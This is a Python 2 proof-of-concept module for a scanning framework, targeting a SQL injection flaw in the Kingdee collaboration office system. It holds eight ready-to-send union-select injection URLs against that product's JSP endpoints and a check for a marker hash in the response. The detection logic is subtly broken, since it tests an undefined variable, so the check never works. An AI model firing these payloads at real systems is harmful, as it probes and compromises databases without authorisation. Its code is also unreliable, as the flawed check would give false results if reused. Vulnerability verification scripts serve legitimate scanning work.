# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType

class Vuln(ABVuln):
    vuln_id = 'Kingdee_0001' # 平台漏洞编号，留空
    name = '金蝶协作办公系统 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-08-26'  # 漏洞公布时间
    desc = '''
        金蝶协作办公系统文件参数过滤不严谨，造成SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'Unkonwn'  # 漏洞来源
    cnvd_id = 'Unkonwn'  # cnvd漏洞编号
    cve_id = 'Unkonwn'  # cve编号
    product = '金蝶协作办公系统'  # 漏洞应用名称
    product_version = 'Unkonwn'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '6b5ff7e5-dad7-4542-8230-cc57c0b2e05a'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-14'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #refer:#http://www.wooyun.org/bugs/wooyun-2015-0136918
            payloads=[
                "/kingdee/tree/tree/announce/get_nodes.jsp?node=1%20union%20select%20NULL,sys.fn_varbintohexstr(hashbytes(%27MD5%27,%20%271234%27))--",
                "/kingdee/tree/tree/announce/get_selected.jsp?ids=1)%20union%20select%20NULL,sys.fn_varbintohexstr(hashbytes(%27MD5%27,%20%271234%27))--",
                "/kingdee/tree/tree/discuss/get_nodes.jsp?node=1%20union%20select%20NULL,sys.fn_varbintohexstr(hashbytes(%27MD5%27,%20%271234%27))--",
                "/kingdee/tree/tree/discuss/get_selected.jsp?ids=1)%20union%20select%20NULL,sys.fn_varbintohexstr(hashbytes(%27MD5%27,%20%271234%27))--",
                "/kingdee/tree/tree/news/get_nodes.jsp?node=1%20union%20select%20NULL,sys.fn_varbintohexstr(hashbytes(%27MD5%27,%20%271234%27))----",
                "/kingdee/tree/tree/news/get_selected.jsp?ids=1)%20union%20select%20NULL,sys.fn_varbintohexstr(hashbytes(%27MD5%27,%20%271234%27))--",
                "/kingdee/tree/tree/rules/get_nodes.jsp?node=1%20union%20select%20NULL,sys.fn_varbintohexstr(hashbytes(%27MD5%27,%20%271234%27))--",
                "/kingdee/tree/tree/rules/get_selected.jsp?ids=1)%20union%20select%20NULL,sys.fn_varbintohexstr(hashbytes(%27MD5%27,%20%271234%27))--"
            ]
            for payload in payloads:
                verify_url = self.target + payload
                r = requests.get(verify_url)

                if r.status_code == 200 and '81dc9bdb52d04dc20036dbd8313ed055' in res:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
